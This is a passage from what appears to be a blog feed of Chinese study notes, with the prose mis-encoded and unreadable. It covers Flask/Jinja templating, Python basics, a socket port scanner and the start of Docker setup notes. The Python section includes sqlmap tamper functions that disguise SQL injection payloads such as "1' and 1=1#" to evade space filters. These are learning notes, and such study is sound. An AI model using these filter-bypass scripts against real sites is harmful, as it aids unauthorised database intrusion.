<li>å¦‚æœæœ‰å¤šä¸ªå‚æ•°çš„æ—¶å€™ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæŠŠæ‰€æœ‰çš„å‚æ•°æ”¾åœ¨<strong>å­—å…¸</strong>ä¸­ï¼Œç„¶ååœ¨<code>render_template</code>ä¸­ï¼Œ<br><strong>ä½¿ç”¨ä¸¤ä¸ªæ˜Ÿå·ï¼ŒæŠŠå­—å…¸è½¬æ¢æˆå…³é”®å‚æ•°ä¼ é€’è¿›å»ï¼Œè¿™æ ·çš„ä»£ç æ›´æ–¹ä¾¿ç®¡ç†å’Œä½¿ç”¨ã€‚</strong></li>
</ul>
<p>3.åœ¨æ¨¡æ¿ä¸­ï¼Œå¦‚æœè¦ä½¿ç”¨ä¸€ä¸ªå˜é‡ï¼Œè¯­æ³•æ˜¯ï¼š<code></code></p>
<p>4.è®¿é—®æ¨¡å‹ä¸­çš„å±æ€§æˆ–è€…æ˜¯å­—å…¸ï¼Œå¯ä»¥é€šè¿‡<code></code>çš„å½¢å¼ï¼Œæˆ–è€…æ˜¯ä½¿ç”¨<code></code>.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">		<span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">        name = <span class="string">'pz1o'</span></span><br><span class="line">        age = <span class="number">18</span></span><br><span class="line">    p = Person()</span><br><span class="line">    <span class="comment">#login_url = url_for('users')</span></span><br><span class="line">    <span class="comment">#return redirect(login_url)</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">'nan'</span>,</span><br><span class="line">        <span class="string">'person'</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line">    </span><br><span class="line">&lt;p&gt;&#123;&#123;person.name&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123;person.age&#125;&#125;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ifå’Œfor"><a href="#ifå’Œfor" class="headerlink" title="ifå’Œfor"></a>ifå’Œfor</h3><p><strong>if</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> xxx %&#125;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">if</span> user%&#125;</span><br><span class="line">        &lt;a href="#"&gt;&#123;&#123; user.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;æ³¨é”€&lt;/a&gt;</span><br><span class="line">&#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">        &lt;a href="#"&gt;ç™»å½•&lt;/a&gt;</span><br><span class="line">        &lt;a href="#"&gt;æ³¨å†Œ&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,user=user)</span><br></pre></td></tr></table></figure>
<p><strong>for</strong></p>
<p>  å­—å…¸çš„éå†ï¼Œè¯­æ³•å’Œ<code>python</code>ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨<code>items()</code>ã€<code>keys()</code>ã€<code>values()</code>ã€<code>iteritems()</code>ã€<code>iterkeys()</code>ã€<code>itervalues()</code></p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> k,v <span class="keyword">in</span> user.items() %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; k &#125;&#125;ï¼š&#123;&#123; v &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>   åˆ—è¡¨çš„éå†ï¼šè¯­æ³•å’Œ<code>python</code>ä¸€æ ·ã€‚</p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> website <span class="keyword">in</span> websites %&#125;</span><br><span class="line">    &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h3><p><img src="/2020/08/13/python%E5%BC%80%E5%8F%91/image-20200814161938542.png" alt="image-20200814161938542"></p>
<p>ä»‹ç»å’Œè¯­æ³•ï¼š</p>
<ul>
<li><p>ä»‹ç»ï¼šè¿‡æ»¤å™¨å¯ä»¥å¤„ç†å˜é‡ï¼ŒæŠŠåŸå§‹çš„å˜é‡ç»è¿‡å¤„ç†åå†å±•ç¤ºå‡ºæ¥ã€‚ä½œç”¨çš„å¯¹è±¡æ˜¯å˜é‡ã€‚</p>
</li>
<li><p>è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;avatar|default()&#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>defaultè¿‡æ»¤å™¨ï¼šå¦‚æœå½“å‰å˜é‡ä¸å­˜åœ¨ï¼Œè¿™æ—¶å€™å¯ä»¥æŒ‡å®šé»˜è®¤å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¿®æ”¹é»˜è®¤å›¾ç‰‡</span></span><br><span class="line">avatar = <span class="string">'xxx'</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,avatar=avatar)</span><br><span class="line">&lt;img src=<span class="string">'&#123;&#123;avatar|default('</span>...<span class="string">')&#125;&#125;'</span>&gt;</span><br></pre></td></tr></table></figure>
<p>lengthè¿‡æ»¤å™¨ï¼šæ±‚åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸²æˆ–è€…å­—å…¸æˆ–è€…å…ƒç»„çš„é•¿åº¦ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç»Ÿè®¡è¯„è®ºæ¡æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">comment = [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'pz1o'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxx'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">'user'</span>:<span class="string">'lzy'</span>,</span><br><span class="line">            <span class="string">'content'</span>:<span class="string">'xxxx'</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,comments=comment)</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;è¯„è®ºæ•°:&#123;&#123; comments|length &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> i <span class="keyword">in</span> comments %&#125;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;a href="#"&gt;&#123;&#123; i.user &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">            &lt;a &gt;&#123;&#123; i.content &#125;&#125;&lt;/a&gt;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ç»§æ‰¿å’Œblock"><a href="#ç»§æ‰¿å’Œblock" class="headerlink" title="ç»§æ‰¿å’Œblock"></a>ç»§æ‰¿å’Œblock</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pythonä¸­çš„ç»§æ‰¿</span><br><span class="line">class Person(object):</span><br><span class="line">	name &#x3D; &#39;pz1o&#39;</span><br><span class="line">	age &#x3D; 18</span><br><span class="line">class Student(Person):</span><br><span class="line">	pass</span><br></pre></td></tr></table></figure>
<p>ç»§æ‰¿ä½œç”¨å’Œè¯­æ³•ï¼š</p>
<ul>
<li><p>ä½œç”¨ï¼šå¯ä»¥æŠŠä¸€äº›å…¬å…±çš„ä»£ç æ”¾åœ¨çˆ¶æ¨¡æ¿ä¸­ï¼Œé¿å…æ¯ä¸ªæ¨¡æ¿å†™åŒæ ·çš„ä»£ç ã€‚</p>
</li>
<li><p>è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#39;base.html&#39;%&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>blockå®ç°ï¼š</p>
<ul>
<li>ä½œç”¨ï¼šå¯ä»¥è®©å­æ¨¡æ¿å®ç°ä¸€äº›è‡ªå·±çš„éœ€æ±‚ã€‚çˆ¶æ¨¡æ¿éœ€è¦æå‰å®šä¹‰å¥½ã€‚</li>
<li>æ³¨æ„ç‚¹ï¼šå­æ¨¡æ¿ä¸­çš„ä»£ç ï¼Œå¿…é¡»æ”¾åœ¨blockå—ä¸­ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% block main %&#125;</span><br><span class="line">    &lt;h1&gt;è¿™æ˜¯é¦–é¡µ&lt;&#x2F;h1&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="pythonå¼€å‘"><a href="#pythonå¼€å‘" class="headerlink" title="pythonå¼€å‘"></a>pythonå¼€å‘</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">print(<span class="string">'hello pz1o'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#linuxä¸‹æ‰§è¡Œ</span></span><br><span class="line">chmod <span class="number">777</span> python</span><br><span class="line">./a.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¼˜åŒ–ç”Ÿæˆpyo</span></span><br><span class="line">python -O -m py_compile a.py</span><br><span class="line">python a.pyo</span><br><span class="line"></span><br><span class="line"><span class="comment">#eval</span></span><br><span class="line">a = <span class="string">'[1,2,3]'</span></span><br><span class="line">b = eval(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#%æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#%c:ascii</span></span><br><span class="line">a = <span class="number">97</span></span><br><span class="line">print(<span class="string">'i am %c'</span>%a)</span><br><span class="line"><span class="comment">#%x:16è¿›åˆ¶</span></span><br><span class="line">print(<span class="string">'i am %x'</span>%a)</span><br><span class="line"><span class="comment">#%o:8è¿›åˆ¶</span></span><br><span class="line">print(<span class="string">'i am %o'</span>%a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ—¥æœŸ</span></span><br><span class="line">time = time.time()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#argså¤„ç†å¤šä½™å‚æ•° argså¤„ç†åˆ—è¡¨å’Œå…ƒç»„ kwargså¤„ç†å­—å…¸</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(num1,num2,*args,**kwargs)</span>:</span></span><br><span class="line">  print(num1-num2)</span><br><span class="line">  print(args)</span><br><span class="line">  print(kwargs)</span><br><span class="line">a = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>]</span><br><span class="line">sub(*a)</span><br><span class="line"><span class="number">2</span>  (<span class="number">2</span>,)  &#123;&#125;</span><br><span class="line">sub(<span class="number">5</span>,<span class="number">3</span>,x=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span>  ()  &#123;<span class="string">'x'</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ–‡ä»¶æ“ä½œ</span></span><br><span class="line"><span class="comment">#råªè¯»  </span></span><br><span class="line"><span class="comment">#wå†™å…¥  åˆ é™¤åŸæ–‡ä»¶ï¼Œé‡æ–°å†™å…¥ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#aå†™å…¥ æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#a+è¯»å†™  æ–‡ä»¶æœ«å°¾è¿½åŠ æ–°çš„å†…å®¹ï¼Œæ— åˆ™åˆ›å»º</span></span><br><span class="line"><span class="comment">#b æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'yyds.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br><span class="line">CUMTCTF&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line">		f.seek(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">  	print(f.read())</span><br><span class="line">&#123;<span class="number">1</span>b8947a6f2b048c284515d8bd209c83f&#125;</span><br><span class="line"><span class="comment">#f.seek('åç§»é‡','é€‰é¡¹')</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º0æ—¶ï¼Œä»æ–‡ä»¶å¤´éƒ¨å‘ååç§»</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º1æ—¶ï¼Œä»å½“å‰ä½ç½®åç§»</span></span><br><span class="line"><span class="comment">#é€‰é¡¹ä¸º2æ—¶ï¼Œä»æ–‡ä»¶æœ«å‘å‰åç§»</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#osæ¨¡å—</span></span><br><span class="line">os.mkdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.rmdir(<span class="string">'./yyds'</span>)</span><br><span class="line">os.listdir(<span class="string">'./'</span>)</span><br><span class="line">os.getcwd()</span><br><span class="line">os.chdir(<span class="string">'../'</span>)  <span class="comment">#æ”¹å˜å½“å‰å·¥ä½œç›®å½•</span></span><br><span class="line">os.system(<span class="string">'dir'</span>)  <span class="comment">#è¿”å›çŠ¶æ€,0ä¸ºæˆåŠŸ,1ä¸ºå¤±è´¥</span></span><br><span class="line">res = os.popen(<span class="string">'dir'</span>)  <span class="comment">#è¿”å›ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">print(res.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•æ‰å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  æ­£å¸¸ä»£ç </span><br><span class="line"><span class="keyword">except</span> é”™è¯¯:</span><br><span class="line">  å¦‚æœå‡ºç°é”™è¯¯ï¼Œæ‰§è¡Œè¿™æ®µä»£ç </span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  æœ€ç»ˆæ‰§è¡Œè¿™æ®µä»£ç </span><br><span class="line">  </span><br><span class="line"><span class="comment">#ç½‘ç»œç¼–ç¨‹</span></span><br><span class="line"><span class="comment">#éå¸¸ç®€æ˜“çš„æ‰«æå™¨</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">port = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">443</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">3389</span>]</span><br><span class="line">allports = [<span class="number">0</span>,<span class="number">65535</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip,port,*args,**kwargs)</span>:</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is open"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[+]The %s port %s is closed"</span>%(ip,port))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ports</span><span class="params">(ip,port)</span>:</span><span class="comment">#search some incoming specific parameters</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> port:</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(array)</span>:</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> array:</span><br><span class="line">        a.append(int(x))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portsplus</span><span class="params">(ip,port)</span>:</span><span class="comment">#search the parameters of an interval passed in</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(port[<span class="number">0</span>],port[<span class="number">1</span>]+<span class="number">1</span>):</span><br><span class="line">        scan(ip,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]You can read the following rules to use this tool.</span></span><br><span class="line"><span class="string">[+]python scanport.py host ports</span></span><br><span class="line"><span class="string">[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80,90,3306,3389</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 80-90</span></span><br><span class="line"><span class="string">[+]python scanport.py 127.0.0.1 all</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">            ports(sys.argv[<span class="number">1</span>],port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">','</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">','</span>)</span><br><span class="line">                ports(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'-'</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>]:</span><br><span class="line">                p = sys.argv[<span class="number">2</span>]</span><br><span class="line">                p = p.split(<span class="string">'-'</span>)</span><br><span class="line">                portsplus(ip,convert(p))</span><br><span class="line">            <span class="keyword">elif</span> sys.argv[<span class="number">2</span>] == <span class="string">'all'</span>:</span><br><span class="line">                portsplus(ip,allports)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">                scan(ip,port)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]There is something wrong!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        print(<span class="string">'''</span></span><br><span class="line"><span class="string">[+]The task has been completed!!!</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#ç±»å’Œå¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    __age = <span class="number">18</span> <span class="comment">#ç§æœ‰å±æ€§</span></span><br><span class="line">    name = <span class="string">'name'</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        self.name = name;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"my name is %s,and my age is %d"</span>%((self.name),(self.__age)))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hello</span><span class="params">(self)</span>:</span><span class="comment">#ç§æœ‰æ–¹æ³•</span></span><br><span class="line">        print(<span class="string">"Hello!! My name is %s"</span>%(self.name))</span><br><span class="line"></span><br><span class="line">pz1o = Person(<span class="string">'pz1o'</span>)</span><br><span class="line">pz1o.introduce()<span class="comment">#å…¬æœ‰æ–¹æ³•è°ƒç”¨</span></span><br><span class="line">print(pz1o._Person__age)<span class="comment">#ç§æœ‰å±æ€§è°ƒç”¨</span></span><br><span class="line">pz1o._Person__hello()<span class="comment">#ç§æœ‰æ–¹æ³•è°ƒç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tamperç¼–å†™</span></span><br><span class="line">--tamper scan.py</span><br><span class="line"><span class="comment">#ç»•ç©ºæ ¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x.isspace():</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' and 1=1#"</span>))</span><br><span class="line"><span class="comment">#ä¸è¿‡æ»¤å¼•å·é‡Œçš„å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">"'"</span> <span class="keyword">or</span> x == <span class="string">'"'</span>:</span><br><span class="line">                flag = <span class="keyword">not</span> flag</span><br><span class="line">                retVal += <span class="string">"'"</span></span><br><span class="line">            <span class="keyword">elif</span> x.isspace() <span class="keyword">and</span> <span class="keyword">not</span> flag:</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                retVal += x</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line">print(tamper(<span class="string">"1' my name is pz1o' and 1=1#"</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>å¼€å‘</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerå­¦ä¹ </title>
    <url>/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç™½å«–çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸èƒ½æµªè´¹äº†ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹docker,åªè®°å½•ä¸€ä¸‹é‡è¦çš„ã€‚</p>
<p>bç«™å­¦ä¹ èµ„æº<a href="https://www.bilibili.com/video/BV1og4y1q7M4?" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1og4y1q7M4?</a></p>
<h1 id="DockeråŸºç¡€"><a href="#DockeråŸºç¡€" class="headerlink" title="DockeråŸºç¡€"></a>DockeråŸºç¡€</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812213743035.png" alt="image-20200812213743035"></p>
<p>é•œåƒï¼ˆ Image ï¼‰ ï¼šDocker é•œåƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æ„å»ºä¹‹åä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚ </p>
<p>å®¹å™¨ï¼ˆ Container ï¼‰ ï¼šé•œåƒï¼ˆ Image ï¼‰å’Œå®¹å™¨ï¼ˆ Container ï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ ç±» å’Œå®ä¾‹ ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚</p>
<p>ä»“åº“ï¼ˆ Repository ï¼‰ï¼šä¸€ä¸ª <strong>Docker Registry</strong> ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆ Repository ï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆ Tag ï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚</p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//1.å¸è½½æ—§ç‰ˆæœ¬</span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                   docker-client \</span><br><span class="line">                   docker-client-latest \</span><br><span class="line">                   docker-common \</span><br><span class="line">                   docker-latest \</span><br><span class="line">                   docker-latest-logrotate \</span><br><span class="line">                   docker-logrotate \</span><br><span class="line">                   docker-engine</span><br><span class="line"></span><br><span class="line">//2.éœ€è¦å®‰è£…å®‰è£…åŒ…</span><br><span class="line">yum install -y yum-utils</span><br><span class="line">//3.è®¾ç½®é•œåƒä»“åº“</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">//4.æ›´æ–°yum</span><br><span class="line">yum makecache fast</span><br><span class="line">//5.å®‰è£…docker</span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line">ä¸€ç›´y</span><br><span class="line">//6.å¯åŠ¨docker</span><br><span class="line">systemctl start docker</span><br><span class="line">//7.æµ‹è¯•docker</span><br><span class="line">docker version </span><br><span class="line">docker run hello-world</span><br><span class="line">//8.dockeré•œåƒ</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812224856499.png" alt="image-20200812224856499"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;å¸è½½docker</span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line">rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker docker é»˜è®¤å·¥ä½œè·¯å¾„</span><br></pre></td></tr></table></figure>
<p><strong>runçš„æµç¨‹</strong></p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813152655350.png" alt="image-20200813152655350"></p>
<h2 id="Dockerä¸vm"><a href="#Dockerä¸vm" class="headerlink" title="Dockerä¸vm"></a>Dockerä¸vm</h2><p>ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ã€‚<strong>å®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚</strong>å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚</p>
<p><img src="/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153605377.png" alt="image-20200813153605377"></p>
